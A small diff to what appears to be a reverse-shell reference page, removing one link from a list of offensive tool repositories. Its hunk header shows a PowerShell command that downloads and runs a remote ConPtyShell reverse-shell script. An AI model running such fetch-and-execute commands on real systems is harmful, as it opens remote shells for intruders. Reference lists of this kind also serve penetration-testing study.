@@ -131,8 +131,6 @@ PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master
 
 - [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)
 
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
-
 - [samratashok: Nishang](https://github.com/samratashok/nishang)
 
 - [Arno0x: PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)
